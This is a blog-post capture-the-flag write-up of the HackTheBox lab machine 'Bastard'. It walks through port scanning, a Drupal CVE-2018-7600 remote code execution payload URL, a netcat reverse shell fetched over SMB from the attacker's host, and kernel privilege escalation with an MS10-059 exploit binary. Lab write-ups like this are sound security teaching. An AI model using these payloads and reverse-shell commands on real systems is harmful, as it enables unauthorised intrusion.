<!doctype html><html lang=en dir=auto><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Bastard | PwndSide</title><meta name=keywords content="windows,web,privesc"><meta name=description content="Windows machine with a webpage powered by Drupal which was our first entry point thanks to CVE-2018-7600 which gives use RCE. For privesc I exploited the MS10-059 which is a unpatched kernel vulnerability."><meta name=author content="Ayman Boulaich"><link rel=canonical href=https://canonical.url/to/page><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.8fe10233a706bc87f2e08b3cf97b8bd4c0a80f10675a143675d59212121037c0.css integrity="sha256-j+ECM6cGvIfy4Is8+XuL1MCoDxBnWhQ2ddWSEhIQN8A=" rel="preload stylesheet" as=style><link rel=icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=http://localhost:1313/posts/bastard-htb/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="http://localhost:1313/posts/bastard-htb/"><meta property="og:site_name" content="PwndSide"><meta property="og:title" content="Bastard"><meta property="og:description" content="Windows machine with a webpage powered by Drupal which was our first entry point thanks to CVE-2018-7600 which gives use RCE. For privesc I exploited the MS10-059 which is a unpatched kernel vulnerability."><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-07-21T17:19:10+02:00"><meta property="article:modified_time" content="2023-07-21T17:19:10+02:00"><meta property="article:tag" content="Windows"><meta property="article:tag" content="Web"><meta property="article:tag" content="Privesc"><meta property="og:image" content="http://localhost:1313/%3Cimage%20path/url%3E"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="http://localhost:1313/%3Cimage%20path/url%3E"><meta name=twitter:title content="Bastard"><meta name=twitter:description content="Windows machine with a webpage powered by Drupal which was our first entry point thanks to CVE-2018-7600 which gives use RCE. For privesc I exploited the MS10-059 which is a unpatched kernel vulnerability."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"http://localhost:1313/posts/"},{"@type":"ListItem","position":2,"name":"Bastard","item":"http://localhost:1313/posts/bastard-htb/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Bastard","name":"Bastard","description":"Windows machine with a webpage powered by Drupal which was our first entry point thanks to CVE-2018-7600 which gives use RCE. For privesc I exploited the MS10-059 which is a unpatched kernel vulnerability.","keywords":["windows","web","privesc"],"articleBody":"Room Information Room name: Bastard Difficulty level: Medium Room link: https://app.hackthebox.com/machines/Bastard Tools Used Nmap Github windows-exploit-suggester Port Scanning sudo nmap $IP -n -Pn -vvv --min-rate 5000 PORT STATE SERVICE REASON VERSION 80/tcp open http syn-ack ttl 127 Microsoft IIS httpd 7.5 |_http-generator: Drupal 7 (http://drupal.org) |_http-title: Welcome to Bastard | Bastard |_http-favicon: Unknown favicon MD5: CF2445DCB53A031C02F9B57E2199BC03 |_http-server-header: Microsoft-IIS/7.5 | http-robots.txt: 36 disallowed entries | /includes/ /misc/ /modules/ /profiles/ /scripts/ | /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt | /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt | /LICENSE.txt /MAINTAINERS.txt /update.php /UPGRADE.txt /xmlrpc.php | /admin/ /comment/reply/ /filter/tips/ /node/add/ /search/ | /user/register/ /user/password/ /user/login/ /user/logout/ /?q=admin/ | /?q=comment/reply/ /?q=filter/tips/ /?q=node/add/ /?q=search/ |_/?q=user/password/ /?q=user/register/ /?q=user/login/ /?q=user/logout/ | http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST |_ Potentially risky methods: TRACE 135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49154/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows We have a http server at port 80 which is a website powered by drupal 7 and two msrpc ports at 135 and 49154.\nEnumeration The only thing we can enumerate is the website, so let’s start with a quick search of any exploit for Drupal 7.\nDrupal is a free and open-source web content management system written in PHP and distributed under the GNU General Public License.\nSearching on Google, I found one github repo https://github.com/dreadlocked/Drupalgeddon2 which take advantage of the CVE-2018-7600 to get a RCE.\nLet’s enumerate other stuff, if we take a look of the website the home page is a login page\nAs always I put the common/default credentials, but nothing seems to work.\nSo I started a quick fuzz for see other way to exploit this machine.\n=============================================================== 2023/07/20 21:33:08 Starting gobuster in directory enumeration mode =============================================================== /.cvsignore/ (Status: 403) [Size: 1233] /.cvs/ (Status: 403) [Size: 1233] /.git/HEAD/ (Status: 403) [Size: 1233] /.hta/ (Status: 403) [Size: 1233] /.bash_history/ (Status: 403) [Size: 1233] /.cache/ (Status: 403) [Size: 1233] /.bashrc/ (Status: 403) [Size: 1233] /.forward/ (Status: 403) [Size: 1233] /.htaccess/ (Status: 403) [Size: 1233] /.history/ (Status: 403) [Size: 1233] /.config/ (Status: 403) [Size: 1233] /.htpasswd/ (Status: 403) [Size: 1233] /.listing/ (Status: 403) [Size: 1233] /.listings/ (Status: 403) [Size: 1233] /.passwd/ (Status: 403) [Size: 1233] /.profile/ (Status: 403) [Size: 1233] /.rhosts/ (Status: 403) [Size: 1233] /.sh_history/ (Status: 403) [Size: 1233] /.ssh/ (Status: 403) [Size: 1233] /.mysql_history/ (Status: 403) [Size: 1233] /.perf/ (Status: 403) [Size: 1233] /.subversion/ (Status: 403) [Size: 1233] /.svn/entries/ (Status: 403) [Size: 1233] /.swf/ (Status: 403) [Size: 1233] /.web/ (Status: 403) [Size: 1233] /.svn/ (Status: 403) [Size: 1233] /0/ (Status: 200) [Size: 7571] /admin/ (Status: 403) [Size: 1233] /Admin/ (Status: 403) [Size: 1233] /ADMIN/ (Status: 403) [Size: 1233] /batch/ (Status: 403) [Size: 1233] /entries/ (Status: 403) [Size: 1233] /Entries/ (Status: 403) [Size: 1233] /includes/ (Status: 403) [Size: 1233] /misc/ (Status: 403) [Size: 1233] /Misc/ (Status: 403) [Size: 1233] /modules/ (Status: 403) [Size: 1233] /node/ (Status: 200) [Size: 7571] /profiles/ (Status: 403) [Size: 1233] /rest/ (Status: 200) [Size: 62] /scripts/ (Status: 403) [Size: 1233] /Scripts/ (Status: 403) [Size: 1233] /search/ (Status: 403) [Size: 1233] /Search/ (Status: 403) [Size: 1233] /sites/ (Status: 403) [Size: 1233] /Sites/ (Status: 403) [Size: 1233] /themes/ (Status: 403) [Size: 1233] /Themes/ (Status: 403) [Size: 1233] /user/ (Status: 200) [Size: 7414] /xmlrpc.php/ (Status: 200) [Size: 42] =============================================================== 2023/07/20 22:23:29 Finished =============================================================== But only we have a bunch of modules and nothing interesting.\nExploiting Reading the exploit docs, we realized that the exploit runs with the following command.\nruby drupalggedon2.rb $IP --verbose This exploits gives us a RCE thanks to a crafted url with the payload which we are going to execute.\nhttp://10.10.10.9/?q=user/password\u0026name[%23post_render][]=passthru\u0026name[%23type]=markup\u0026name[%23markup]={payload} I put a smbserver.py on the nc.exe directory in order to execute the next payload to have a reverse shell.\n\\\\10.10.14.20\\smbFolder\\nc.exe -e cmd 10.10.14.20 4444 nc -lv 4444 Gaining an Initial Foothold We are nt authority\\iusr\nLet’s try to acces to the user’s directory in order to cat the user’s flag.\nEscalating Privilege Let’s see what version of windows is running this machine. The output of the systeminfo command shows the OS name and version.\nHost Name: BASTARD OS Name: Microsoft Windows Server 2008 R2 Datacenter OS Version: 6.1.7600 N/A Build 7600 OS Manufacturer: Microsoft Corporation OS Configuration: Standalone Server OS Build Type: Multiprocessor Free Registered Owner: Windows User Registered Organization: Product ID: 55041-402-3582622-84461 Original Install Date: 18/3/2017, 7:04:46 �� System Boot Time: 21/7/2023, 4:49:40 �� System Manufacturer: VMware, Inc. System Model: VMware Virtual Platform System Type: x64-based PC Processor(s): 2 Processor(s) Installed. [01]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2294 Mhz [02]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2294 Mhz BIOS Version: Phoenix Technologies LTD 6.00, 12/12/2018 Windows Directory: C:\\Windows System Directory: C:\\Windows\\system32 Boot Device: \\Device\\HarddiskVolume1 System Locale: el;Greek Input Locale: en-us;English (United States) Time Zone: (UTC+02:00) Athens, Bucharest, Istanbul Total Physical Memory: 2.047 MB Available Physical Memory: 1.583 MB Virtual Memory: Max Size: 4.095 MB Virtual Memory: Available: 3.606 MB Virtual Memory: In Use: 489 MB Page File Location(s): C:\\pagefile.sys Domain: HTB Logon Server: N/A Hotfix(s): N/A Network Card(s): 1 NIC(s) Installed. [01]: Intel(R) PRO/1000 MT Network Connection Connection Name: Local Area Connection DHCP Enabled: No IP address(es) [01]: 10.10.10.9 We are managing a Microsoft Windows Server 2008 R2 Datacenter 6.1.7600 with no Hostfix(s). Let’s see with the help of windows-exploit-suggester if exists any unpatched kernel vulnerability.\nI saved the systeminfo output to a txt file to pass the file to my computer to run the windows-exploit-suggester without problems.\nFirst we need to update the database with\npython2 ./windows-exploit-suggester.py -u Then we need to pass the following arguments to run it.\npython2 ./windows-exploit-suggester.py --database database.xls --systeminfo systeminfo.txt [M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical [M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important [E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical [*] http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP \u0026 EMET 5., PoC [*] http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP \u0026 EMET 5.0 Bypass (MS12-037), PoC [*] [E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important [M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important [M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical [E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important [E] MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (981852) - Important [M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical [M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical The scan results show three non-metasploit vulnerabilities.\nI googled the MS11-011 exploit but seems a Windows XP exploit, so I tried the MS10-059.\nMS10-059 I found a github repo Chimichurri.exe with a compiled binary of the MS10-059 exploit.\nOnly rests, send the exploit (I send it with smbserver.py in the file directory).\nIn order to send the file without problems, I created a directory on C:\\Windows\\Temp called PrivEsc.\ncd C:\\Windows\\Temp mkdir PrivEsc cd PrivEsc copy \\\\10.10.14.20\\smbFolder\\Chimichurri.exe . Once send it, let’s run it and set a nc listener and see the magic happens.\n.\\Chimichurri.exe 10.10.14.20 4445 nc -lv 4445 Other machine down\nThank you for reading, and happy hacking! 😄\n","wordCount":"1209","inLanguage":"en","image":"http://localhost:1313/%3Cimage%20path/url%3E","datePublished":"2023-07-21T17:19:10+02:00","dateModified":"2023-07-21T17:19:10+02:00","author":{"@type":"Person","name":"Ayman Boulaich"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:1313/posts/bastard-htb/"},"publisher":{"@type":"Organization","name":"PwndSide","logo":{"@type":"ImageObject","url":"http://localhost:1313/%3Clink%20/%20abs%20url%3E"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=http://localhost:1313/ accesskey=h title="PwndSide (Alt + H)"><img src=http://localhost:1313/apple-touch-icon.png alt aria-label=logo height=35>PwndSide</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=http://localhost:1313/categories/hackthebox title=HackTheBox><span>HackTheBox</span></a></li><li><a href=http://localhost:1313/categories/ctf title="CTF's"><span>CTF's</span></a></li><li><a href=http://localhost:1313/about/whoami/ title=whoami><span>whoami</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=http://localhost:1313/>Home</a>&nbsp;»&nbsp;<a href=http://localhost:1313/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">Bastard</h1><div class=post-description>Windows machine with a webpage powered by Drupal which was our first entry point thanks to CVE-2018-7600 which gives use RCE. For privesc I exploited the MS10-059 which is a unpatched kernel vulnerability.</div><div class=post-meta><span title='2023-07-21 17:19:10 +0200 CEST'>July 21, 2023</span>&nbsp;·&nbsp;6 min&nbsp;·&nbsp;1209 words&nbsp;·&nbsp;Ayman Boulaich&nbsp;|&nbsp;<a href=https://github.com/pwndside/pwndside.github.io/content/posts/bastard-htb.md rel="noopener noreferrer edit" target=_blank>Suggest Changes</a></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#room-information>Room Information</a></li><li><a href=#tools-used>Tools Used</a></li><li><a href=#port-scanning>Port Scanning</a></li><li><a href=#enumeration>Enumeration</a></li><li><a href=#exploiting>Exploiting</a></li><li><a href=#gaining-an-initial-foothold>Gaining an Initial Foothold</a></li><li><a href=#escalating-privilege>Escalating Privilege</a><ul><li><a href=#ms10-059>MS10-059</a></li></ul></li></ul></nav></div></details></div><div class=post-content><h2 id=room-information>Room Information<a hidden class=anchor aria-hidden=true href=#room-information>#</a></h2><ul><li>Room name: Bastard</li><li>Difficulty level: Medium</li><li>Room link: <a href=https://app.hackthebox.com/machines/Bastard>https://app.hackthebox.com/machines/Bastard</a></li></ul><p><img alt=Untitled loading=lazy src=/HTB/bastard-icon.png></p><h2 id=tools-used>Tools Used<a hidden class=anchor aria-hidden=true href=#tools-used>#</a></h2><ul><li>Nmap</li><li>Github</li><li>windows-exploit-suggester</li></ul><h2 id=port-scanning>Port Scanning<a hidden class=anchor aria-hidden=true href=#port-scanning>#</a></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo nmap <span class=nv>$IP</span> -n -Pn -vvv --min-rate <span class=m>5000</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>PORT</span>      <span class=n>STATE</span> <span class=n>SERVICE</span> <span class=n>REASON</span>          <span class=n>VERSION</span>
</span></span><span class=line><span class=cl><span class=mf>80</span><span class=p>/</span><span class=n>tcp</span>    <span class=n>open</span>  <span class=n>http</span>    <span class=nb>syn-ack</span> <span class=n>ttl</span> <span class=mf>127</span> <span class=n>Microsoft</span> <span class=n>IIS</span> <span class=n>httpd</span> <span class=mf>7.5</span>
</span></span><span class=line><span class=cl><span class=p>|</span><span class=n>_http-generator:</span> <span class=n>Drupal</span> <span class=mf>7</span> <span class=p>(</span><span class=n>http</span><span class=err>:</span><span class=p>//</span><span class=n>drupal</span><span class=p>.</span><span class=n>org</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span><span class=n>_http-title:</span> <span class=n>Welcome</span> <span class=n>to</span> <span class=n>Bastard</span> <span class=p>|</span> <span class=n>Bastard</span>
</span></span><span class=line><span class=cl><span class=p>|</span><span class=n>_http-favicon:</span> <span class=n>Unknown</span> <span class=n>favicon</span> <span class=n>MD5</span><span class=err>:</span> <span class=n>CF2445DCB53A031C02F9B57E2199BC03</span>
</span></span><span class=line><span class=cl><span class=p>|</span><span class=n>_http-server-header:</span> <span class=nb>Microsoft-IIS</span><span class=p>/</span><span class=mf>7.5</span>
</span></span><span class=line><span class=cl><span class=p>|</span> <span class=nb>http-robots</span><span class=p>.</span><span class=n>txt</span><span class=err>:</span> <span class=mf>36</span> <span class=n>disallowed</span> <span class=n>entries</span>
</span></span><span class=line><span class=cl><span class=p>|</span> <span class=p>/</span><span class=n>includes</span><span class=p>/</span> <span class=p>/</span><span class=n>misc</span><span class=p>/</span> <span class=p>/</span><span class=n>modules</span><span class=p>/</span> <span class=p>/</span><span class=n>profiles</span><span class=p>/</span> <span class=p>/</span><span class=n>scripts</span><span class=p>/</span>
</span></span><span class=line><span class=cl><span class=p>|</span> <span class=p>/</span><span class=n>themes</span><span class=p>/</span> <span class=p>/</span><span class=n>CHANGELOG</span><span class=p>.</span><span class=py>txt</span> <span class=p>/</span><span class=n>cron</span><span class=p>.</span><span class=py>php</span> <span class=p>/</span><span class=n>INSTALL</span><span class=p>.</span><span class=py>mysql</span><span class=p>.</span><span class=py>txt</span>
</span></span><span class=line><span class=cl><span class=p>|</span> <span class=p>/</span><span class=n>INSTALL</span><span class=p>.</span><span class=py>pgsql</span><span class=p>.</span><span class=py>txt</span> <span class=p>/</span><span class=n>INSTALL</span><span class=p>.</span><span class=py>sqlite</span><span class=p>.</span><span class=py>txt</span> <span class=p>/</span><span class=n>install</span><span class=p>.</span><span class=py>php</span> <span class=p>/</span><span class=n>INSTALL</span><span class=p>.</span><span class=py>txt</span>
</span></span><span class=line><span class=cl><span class=p>|</span> <span class=p>/</span><span class=n>LICENSE</span><span class=p>.</span><span class=py>txt</span> <span class=p>/</span><span class=n>MAINTAINERS</span><span class=p>.</span><span class=py>txt</span> <span class=p>/</span><span class=n>update</span><span class=p>.</span><span class=py>php</span> <span class=p>/</span><span class=n>UPGRADE</span><span class=p>.</span><span class=py>txt</span> <span class=p>/</span><span class=n>xmlrpc</span><span class=p>.</span><span class=py>php</span>
</span></span><span class=line><span class=cl><span class=p>|</span> <span class=p>/</span><span class=n>admin</span><span class=p>/</span> <span class=p>/</span><span class=n>comment</span><span class=p>/</span><span class=n>reply</span><span class=p>/</span> <span class=p>/</span><span class=k>filter</span><span class=p>/</span><span class=n>tips</span><span class=p>/</span> <span class=p>/</span><span class=n>node</span><span class=p>/</span><span class=n>add</span><span class=p>/</span> <span class=p>/</span><span class=n>search</span><span class=p>/</span>
</span></span><span class=line><span class=cl><span class=p>|</span> <span class=p>/</span><span class=n>user</span><span class=p>/</span><span class=n>register</span><span class=p>/</span> <span class=p>/</span><span class=n>user</span><span class=p>/</span><span class=n>password</span><span class=p>/</span> <span class=p>/</span><span class=n>user</span><span class=p>/</span><span class=n>login</span><span class=p>/</span> <span class=p>/</span><span class=n>user</span><span class=p>/</span><span class=n>logout</span><span class=p>/</span> <span class=p>/</span><span class=k>?</span><span class=n>q</span><span class=p>=</span><span class=n>admin</span><span class=p>/</span>
</span></span><span class=line><span class=cl><span class=p>|</span> <span class=p>/</span><span class=k>?</span><span class=n>q</span><span class=p>=</span><span class=n>comment</span><span class=p>/</span><span class=n>reply</span><span class=p>/</span> <span class=p>/</span><span class=k>?</span><span class=n>q</span><span class=p>=</span><span class=k>filter</span><span class=p>/</span><span class=n>tips</span><span class=p>/</span> <span class=p>/</span><span class=k>?</span><span class=n>q</span><span class=p>=</span><span class=n>node</span><span class=p>/</span><span class=n>add</span><span class=p>/</span> <span class=p>/</span><span class=k>?</span><span class=n>q</span><span class=p>=</span><span class=n>search</span><span class=p>/</span>
</span></span><span class=line><span class=cl><span class=p>|</span><span class=n>_</span><span class=p>/</span><span class=k>?</span><span class=n>q</span><span class=p>=</span><span class=n>user</span><span class=p>/</span><span class=n>password</span><span class=p>/</span> <span class=p>/</span><span class=k>?</span><span class=n>q</span><span class=p>=</span><span class=n>user</span><span class=p>/</span><span class=n>register</span><span class=p>/</span> <span class=p>/</span><span class=k>?</span><span class=n>q</span><span class=p>=</span><span class=n>user</span><span class=p>/</span><span class=n>login</span><span class=p>/</span> <span class=p>/</span><span class=k>?</span><span class=n>q</span><span class=p>=</span><span class=n>user</span><span class=p>/</span><span class=n>logout</span><span class=p>/</span>
</span></span><span class=line><span class=cl><span class=p>|</span> <span class=nb>http-methods</span><span class=err>:</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=n>Supported</span> <span class=n>Methods</span><span class=err>:</span> <span class=n>OPTIONS</span> <span class=n>TRACE</span> <span class=n>GET</span> <span class=n>HEAD</span> <span class=n>POST</span>
</span></span><span class=line><span class=cl><span class=p>|</span><span class=n>_</span>  <span class=n>Potentially</span> <span class=n>risky</span> <span class=n>methods</span><span class=err>:</span> <span class=n>TRACE</span>
</span></span><span class=line><span class=cl><span class=mf>135</span><span class=p>/</span><span class=n>tcp</span>   <span class=n>open</span>  <span class=n>msrpc</span>   <span class=nb>syn-ack</span> <span class=n>ttl</span> <span class=mf>127</span> <span class=n>Microsoft</span> <span class=n>Windows</span> <span class=n>RPC</span>
</span></span><span class=line><span class=cl><span class=mf>49154</span><span class=p>/</span><span class=n>tcp</span> <span class=n>open</span>  <span class=n>msrpc</span>   <span class=nb>syn-ack</span> <span class=n>ttl</span> <span class=mf>127</span> <span class=n>Microsoft</span> <span class=n>Windows</span> <span class=n>RPC</span>
</span></span><span class=line><span class=cl><span class=n>Service</span> <span class=n>Info</span><span class=err>:</span> <span class=n>OS</span><span class=err>:</span> <span class=n>Windows</span><span class=p>;</span> <span class=n>CPE</span><span class=err>:</span> <span class=n>cpe</span><span class=err>:</span><span class=p>/</span><span class=n>o:microsoft</span><span class=err>:</span><span class=n>windows</span>
</span></span></code></pre></div><p>We have a http server at <strong>port 80</strong> which is a website powered by drupal 7 and two msrpc ports at <strong>135</strong> and <strong>49154.</strong></p><h2 id=enumeration>Enumeration<a hidden class=anchor aria-hidden=true href=#enumeration>#</a></h2><p>The only thing we can enumerate is the website, so let’s start with a quick search of any exploit for Drupal 7.</p><p>Drupal is a free and open-source web content management system written in PHP and distributed under the GNU General Public License.</p><p><img alt=Untitled loading=lazy src=/HTB/bastard-1.png></p><p>Searching on Google, I found one github repo <a href=https://github.com/dreadlocked/Drupalgeddon2>https://github.com/dreadlocked/Drupalgeddon2</a> which take advantage of the <strong>CVE-2018-7600</strong> to get a RCE.</p><p>Let’s enumerate other stuff, if we take a look of the website the home page is a login page</p><p><img alt=Untitled loading=lazy src=/HTB/bastard-2.png></p><p>As always I put the common/default credentials, but nothing seems to work.</p><p>So I started a quick fuzz for see other way to exploit this machine.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=p>===============================================================</span>
</span></span><span class=line><span class=cl><span class=mf>2023</span><span class=p>/</span><span class=mf>07</span><span class=p>/</span><span class=mf>20</span> <span class=mf>21</span><span class=err>:</span><span class=mf>33</span><span class=err>:</span><span class=mf>08</span> <span class=n>Starting</span> <span class=n>gobuster</span> <span class=k>in</span> <span class=n>directory</span> <span class=n>enumeration</span> <span class=n>mode</span>
</span></span><span class=line><span class=cl><span class=p>===============================================================</span>
</span></span><span class=line><span class=cl><span class=p>/.</span><span class=n>cvsignore</span><span class=p>/</span>          <span class=p>(</span><span class=n>Status</span><span class=err>:</span> <span class=mf>403</span><span class=p>)</span> <span class=p>[</span><span class=n>Size</span><span class=err>:</span> <span class=mf>1233</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>/.</span><span class=n>cvs</span><span class=p>/</span>                <span class=p>(</span><span class=n>Status</span><span class=err>:</span> <span class=mf>403</span><span class=p>)</span> <span class=p>[</span><span class=n>Size</span><span class=err>:</span> <span class=mf>1233</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>/.</span><span class=n>git</span><span class=p>/</span><span class=n>HEAD</span><span class=p>/</span>           <span class=p>(</span><span class=n>Status</span><span class=err>:</span> <span class=mf>403</span><span class=p>)</span> <span class=p>[</span><span class=n>Size</span><span class=err>:</span> <span class=mf>1233</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>/.</span><span class=n>hta</span><span class=p>/</span>                <span class=p>(</span><span class=n>Status</span><span class=err>:</span> <span class=mf>403</span><span class=p>)</span> <span class=p>[</span><span class=n>Size</span><span class=err>:</span> <span class=mf>1233</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>/.</span><span class=n>bash_history</span><span class=p>/</span>       <span class=p>(</span><span class=n>Status</span><span class=err>:</span> <span class=mf>403</span><span class=p>)</span> <span class=p>[</span><span class=n>Size</span><span class=err>:</span> <span class=mf>1233</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>/.</span><span class=n>cache</span><span class=p>/</span>              <span class=p>(</span><span class=n>Status</span><span class=err>:</span> <span class=mf>403</span><span class=p>)</span> <span class=p>[</span><span class=n>Size</span><span class=err>:</span> <span class=mf>1233</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>/.</span><span class=n>bashrc</span><span class=p>/</span>             <span class=p>(</span><span class=n>Status</span><span class=err>:</span> <span class=mf>403</span><span class=p>)</span> <span class=p>[</span><span class=n>Size</span><span class=err>:</span> <span class=mf>1233</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>/.</span><span class=n>forward</span><span class=p>/</span>            <span class=p>(</span><span class=n>Status</span><span class=err>:</span> <span class=mf>403</span><span class=p>)</span> <span class=p>[</span><span class=n>Size</span><span class=err>:</span> <span class=mf>1233</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>/.</span><span class=n>htaccess</span><span class=p>/</span>           <span class=p>(</span><span class=n>Status</span><span class=err>:</span> <span class=mf>403</span><span class=p>)</span> <span class=p>[</span><span class=n>Size</span><span class=err>:</span> <span class=mf>1233</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>/.</span><span class=n>history</span><span class=p>/</span>            <span class=p>(</span><span class=n>Status</span><span class=err>:</span> <span class=mf>403</span><span class=p>)</span> <span class=p>[</span><span class=n>Size</span><span class=err>:</span> <span class=mf>1233</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>/.</span><span class=n>config</span><span class=p>/</span>             <span class=p>(</span><span class=n>Status</span><span class=err>:</span> <span class=mf>403</span><span class=p>)</span> <span class=p>[</span><span class=n>Size</span><span class=err>:</span> <span class=mf>1233</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>/.</span><span class=n>htpasswd</span><span class=p>/</span>           <span class=p>(</span><span class=n>Status</span><span class=err>:</span> <span class=mf>403</span><span class=p>)</span> <span class=p>[</span><span class=n>Size</span><span class=err>:</span> <span class=mf>1233</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>/.</span><span class=n>listing</span><span class=p>/</span>            <span class=p>(</span><span class=n>Status</span><span class=err>:</span> <span class=mf>403</span><span class=p>)</span> <span class=p>[</span><span class=n>Size</span><span class=err>:</span> <span class=mf>1233</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>/.</span><span class=n>listings</span><span class=p>/</span>           <span class=p>(</span><span class=n>Status</span><span class=err>:</span> <span class=mf>403</span><span class=p>)</span> <span class=p>[</span><span class=n>Size</span><span class=err>:</span> <span class=mf>1233</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>/.</span><span class=n>passwd</span><span class=p>/</span>             <span class=p>(</span><span class=n>Status</span><span class=err>:</span> <span class=mf>403</span><span class=p>)</span> <span class=p>[</span><span class=n>Size</span><span class=err>:</span> <span class=mf>1233</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>/.</span><span class=n>profile</span><span class=p>/</span>            <span class=p>(</span><span class=n>Status</span><span class=err>:</span> <span class=mf>403</span><span class=p>)</span> <span class=p>[</span><span class=n>Size</span><span class=err>:</span> <span class=mf>1233</span><span class=p>]</span>
